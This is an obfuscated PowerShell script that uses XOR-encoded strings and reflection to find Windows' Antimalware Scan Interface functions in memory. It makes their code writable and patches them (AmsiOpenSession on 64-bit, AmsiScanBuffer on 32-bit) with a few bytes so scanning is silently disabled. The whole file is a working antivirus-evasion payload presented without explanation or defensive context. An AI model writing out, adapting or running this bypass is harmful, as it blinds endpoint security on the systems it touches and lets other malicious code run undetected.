
function gxayidvnwj {

 Param ($moduleName, $functionName)

 $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].
 Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 $tmp=@()
 $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
 return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function gxccynaosf {
 Param (
 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,[Parameter(Position = 1)] [Type] $delType = [Void])
 $type = [AppDomain]::CurrentDomain.
 DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
 DefineDynamicModule('InMemoryModule', $false).
 DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
  [System.MulticastDelegate])
  $type.
 DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
 SetImplementationFlags('Runtime, Managed')
 $type.
  DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
 return $type.CreateType()
}

[Byte[]] $coeikrgzkr =  0x48, 0x31, 0xC0
[byte[]] $rgoppktmvs = 0x90
[byte[]] $yoiluuribf = 0xc3
[Byte[]] $agirolgjxg =  $yoiluuribf + $rgoppktmvs + $rgoppktmvs
[Byte[]] $trnksclyhc = 0x33, 0x3f, 0x21, 0x3b, 0x7c, 0x36, 0x3e, 0x3e
[byte[]] $dsfiuutrzt = 0x13, 0x3f, 0x21, 0x3b, 0x1d, 0x22, 0x37, 0x3c, 0x1, 0x37, 0x21, 0x21, 0x3b, 0x3d, 0x3c
[Byte[]] $xmuwkzuifz = 0x21, 0x2b, 0x21, 0x26, 0x37, 0x3f, 0x7c, 0x36, 0x3e, 0x3e
[byte[]] $tztummumhb = 0x39, 0x37, 0x20, 0x3c, 0x37, 0x3e, 0x61, 0x60, 0x7c, 0x36, 0x3e, 0x3e
[Byte[]] $rqxgfcvkql = 0x4, 0x3b, 0x20, 0x26, 0x27, 0x33
[Byte[]] $hlxrlnamje = 0x3e, 0x2, 0x20, 0x3d, 0x26, 0x37, 0x31, 0x26
[Byte[]] $wuzpphdjss = 0x13, 0x3f, 0x21
[Byte[]] $oklmdmweck = 0x3b, 0x1, 0x31, 0x33, 0x3c, 0x10, 0x27, 0x34, 0x34, 0x37, 0x20

for($i=0; $i -lt $trnksclyhc.count ; $i++)
{
    $trnksclyhc[$i] = $trnksclyhc[$i] -bxor 0x52
}

$a = [System.Text.Encoding]::ASCII.GetString($trnksclyhc)
$a
for($i=0; $i -lt $dsfiuutrzt.count ; $i++)
{
    $dsfiuutrzt[$i] = $dsfiuutrzt[$i] -bxor 0x52
}


$b = [System.Text.Encoding]::ASCII.GetString($dsfiuutrzt)
$b
for($i=0; $i -lt $xmuwkzuifz.count ; $i++)
{
    $xmuwkzuifz[$i] = $xmuwkzuifz[$i] -bxor 0x52
}

$c = [System.Text.Encoding]::ASCII.GetString($xmuwkzuifz)
$c
for($i=0; $i -lt $tztummumhb.count ; $i++)
{
    $tztummumhb[$i] = $tztummumhb[$i] -bxor 0x52
}

$d = [System.Text.Encoding]::ASCII.GetString($tztummumhb)
$d

for($i=0; $i -lt $rqxgfcvkql.count ; $i++)
{
    $rqxgfcvkql[$i] = $rqxgfcvkql[$i] -bxor 0x52
}
$e = [System.Text.Encoding]::ASCII.GetString($rqxgfcvkql)
$e

for($i=0; $i -lt $hlxrlnamje.count ; $i++)
{
    $hlxrlnamje[$i] = $hlxrlnamje[$i] -bxor 0x52
}

$f = [System.Text.Encoding]::ASCII.GetString($hlxrlnamje)
$e = $e+$f
$e

for($i=0; $i -lt $wuzpphdjss.count ; $i++)
{
    $wuzpphdjss[$i] = $wuzpphdjss[$i] -bxor 0x52
}

$g = [System.Text.Encoding]::ASCII.GetString($wuzpphdjss)

for($i=0; $i -lt $oklmdmweck.count ; $i++)
{
    $oklmdmweck[$i] = $oklmdmweck[$i] -bxor 0x52
}

$h = [System.Text.Encoding]::ASCII.GetString($oklmdmweck)
$g = $g+$h

$aaar = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((gxayidvnwj $d $e), (gxccynaosf @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

if ([Environment]::Is64BitProcess -eq [Environment]::Is64BitOperatingSystem)
{
[IntPtr]$biwwifqvpc = gxayidvnwj $a $b
$vp.Invoke($biwwifqvpc, 3, 0x40, [ref]$aaar)
[System.Runtime.InteropServices.Marshal]::Copy($coeikrgzkr, 0, $biwwifqvpc, 3)
$vp.Invoke($biwwifqvpc, 3, 0x20, [ref]$aaar)
}
else
{
[IntPtr]$xnntnwrshs = gxayidvnwj $a $g
$vp.Invoke($xnntnwrshs , 3, 0x40, [ref]$aaar)
[System.Runtime.InteropServices.Marshal]::Copy($agirolgjxg, 0, $xnntnwrshs , 3)
$vp.Invoke($xnntnwrshs , 3, 0x20, [ref]$aaar)
}

